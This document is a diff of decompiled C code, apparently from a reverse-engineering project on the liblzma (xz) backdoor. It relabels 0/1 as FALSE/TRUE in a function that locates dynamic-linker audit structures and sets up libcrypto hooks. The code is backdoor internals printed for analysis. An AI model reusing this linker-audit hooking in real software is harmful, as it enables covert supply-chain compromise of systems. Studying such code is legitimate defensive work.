@@ -41,13 +41,13 @@ BOOL find_dl_audit_offsets
   lzma_allocator *libcrypto_allocator;
   
   bVar15 = 0;
-  BVar8 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x0,10,0,0);
-  if (BVar8 != 0) {
+  BVar8 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x0,10,0,FALSE);
+  if (BVar8 != FALSE) {
     allocator = get_lzma_allocator();
     peVar2 = data->elf_handles->libcrypto;
     allocator->opaque = peVar2;
     pEVar9 = elf_symbol_get(peVar2,STR_EC_POINT_point2oct,0);
-    if (data->elf_handles->liblzma->gnurelro_found != 0) {
+    if (data->elf_handles->liblzma->gnurelro_found != FALSE) {
       if (pEVar9 != (Elf64_Sym *)0x0) {
         EVar3 = pEVar9->st_value;
         pEVar4 = data->elf_handles->libcrypto->elfbase;
@@ -80,8 +80,9 @@ BOOL find_dl_audit_offsets
         (hooks->ldso_ctx)._dl_audit_symbind_alt__size = size;
         (hooks->ldso_ctx)._dl_audit_symbind_alt = (_func_64 *)vaddr;
         BVar8 = elf_contains_vaddr(peVar2,vaddr,size,4);
-        if ((BVar8 != 0) &&
-           (BVar8 = find_link_map_l_name(data,libname_offset,hooks,imported_funcs), BVar8 != 0)) {
+        if ((BVar8 != FALSE) &&
+           (BVar8 = find_link_map_l_name(data,libname_offset,hooks,imported_funcs), BVar8 != FALSE))
+        {
           p_Var12 = (_func_50 *)lzma_alloc(0xb28,allocator);
           imported_funcs->EVP_CIPHER_CTX_free = p_Var12;
           if (p_Var12 != (_func_50 *)0x0) {
@@ -89,9 +90,9 @@ BOOL find_dl_audit_offsets
           }
           BVar8 = find_dl_naudit(data->elf_handles->dynamic_linker,data->elf_handles->libcrypto,
                                  hooks,imported_funcs);
-          if ((BVar8 != 0) &&
+          if ((BVar8 != FALSE) &&
              (BVar8 = find_link_map_l_audit_any_plt(data,*libname_offset,hooks,imported_funcs),
-             BVar8 != 0)) {
+             BVar8 != FALSE)) {
             pbVar14 = hooks;
             for (lVar13 = 0x10; lVar13 != 0; lVar13 = lVar13 + -1) {
               (pbVar14->ldso_ctx)._unknown1459[0] = '\0';
@@ -111,7 +112,7 @@ BOOL find_dl_audit_offsets
                   lVar13 = lVar13 + 1;
                 } while ((ulong)uVar1 << 3 != lVar13);
               }
-              return 1;
+              return TRUE;
             }
           }
         }
@@ -121,6 +122,6 @@ BOOL find_dl_audit_offsets
     lzma_free(imported_funcs->EC_KEY_get0_group,allocator);
     lzma_free(imported_funcs->EVP_CIPHER_CTX_free,allocator);
   }
-  return 0;
+  return FALSE;
 }
 
